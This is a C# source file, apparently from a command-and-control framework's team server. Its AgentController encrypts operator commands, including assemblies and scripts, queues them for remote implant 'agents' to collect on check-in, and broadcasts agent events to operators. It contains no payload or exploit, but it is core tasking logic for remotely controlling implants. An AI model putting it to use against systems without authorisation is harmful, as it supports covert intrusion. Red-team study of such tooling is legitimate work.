using Microsoft.AspNetCore.SignalR;
using Newtonsoft.Json;
using Shared.Models;
using Shared.Utilities;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using TeamServer.Hubs;

namespace TeamServer.Controllers
{
    public class AgentController
    {
        public CryptoController Crypto;

        IHubContext<MessageHub> HubContext;

        List<AgentMetadata> Agents = new List<AgentMetadata>();
        Dictionary<string, Queue<AgentMessage>> AgentTasks = new Dictionary<string, Queue<AgentMessage>>();
        List<AgentEvent> AgentEvents = new List<AgentEvent>();

        event EventHandler<AgentEvent> OnAgentEvent;

        public AgentController(CryptoController Crypto, IHubContext<MessageHub> HubContext)
        {
            this.HubContext = HubContext;
            this.Crypto = Crypto;

            OnAgentEvent += AgentController_OnAgentEvent;
        }

        public void SendAgentCommand(AgentCommandRequest Request, string Nick)
        {
            var sessionKey = Crypto.GetSessionKey(Request.AgentID);

            var data = Utilities.EncryptData(new C2Data
            {
                Module = Request.Module,
                Command = Request.Command,
                Data = Request.Data
            },
            sessionKey, out byte[] iv);

            SendAgentMessage(new AgentMessage
            {
                AgentID = Request.AgentID,
                Data = data,
                IV = iv
            });

            var builder = new StringBuilder();
            builder.Append(Request.Module.ToLower());
            builder.Append(" " + Request.Command.ToLower());

            var parameters = JsonConvert.DeserializeObject<AgentTask>(Encoding.UTF8.GetString(Request.Data)).Parameters;

            if (parameters != null)
            {
                foreach (var param in parameters)
                {
                    if (param.Value != null)
                    {
                        if (param.Name.Equals("Assembly", StringComparison.OrdinalIgnoreCase) || param.Name.Equals("Script", StringComparison.OrdinalIgnoreCase))
                        {
                            continue;
                        };

                        builder.Append(" " + param.Value);
                    }
                }
            }

            OnAgentEvent?.Invoke(this, new AgentEvent(Request.AgentID, AgentEvent.EventType.CommandRequest, builder.ToString(), Nick));
        }

        public void SendAgentMessage(AgentMessage Message)
        {
            if (!AgentTasks.ContainsKey(Message.AgentID))
            {
                AgentTasks.Add(Message.AgentID, new Queue<AgentMessage>());
            }

            AgentTasks[Message.AgentID].Enqueue(Message);
        }

        public AgentMessage GetAgentTask(string AgentID)
        {
            AgentCheckin(AgentID);

            if (AgentTasks.ContainsKey(AgentID))
            {
                if (AgentTasks[AgentID].Count > 0)
                {
                    return AgentTasks[AgentID].Dequeue();
                }
            }

            return null;
        }

        public void AddNewAgent(AgentMetadata Metadata)
        {
            if (!Agents.Contains(Metadata))
            {
                Agents.Add(Metadata);
                OnAgentEvent?.Invoke(this, new AgentEvent(Metadata.AgentID, AgentEvent.EventType.InitialAgent, Metadata));
            }
        }

        public IEnumerable<AgentMetadata> GetAgents()
        {
            return Agents;
        }

        public void AddNewEvent(AgentEvent Event)
        {
            OnAgentEvent?.Invoke(this, Event);
        }

        public IEnumerable<AgentEvent> GetEventsSince(DateTime Date)
        {
            return AgentEvents.Where(e => e.Date >= Date);
        }

        void AgentCheckin(string AgentID)
        {
            var agent = Agents.FirstOrDefault(a => a.AgentID.Equals(AgentID, StringComparison.OrdinalIgnoreCase));

            if (agent != null)
            {
                var lastSeen = DateTime.UtcNow;
                agent.LastSeen = lastSeen;
                OnAgentEvent?.Invoke(this, new AgentEvent(AgentID, AgentEvent.EventType.AgentCheckin, lastSeen));
            }
        }

        public async void AgentController_OnAgentEvent(object sender, AgentEvent e)
        {
            AgentEvents.Add(e);
            await HubContext.Clients.All.SendAsync("AgentEvent", e);
        }
    }
}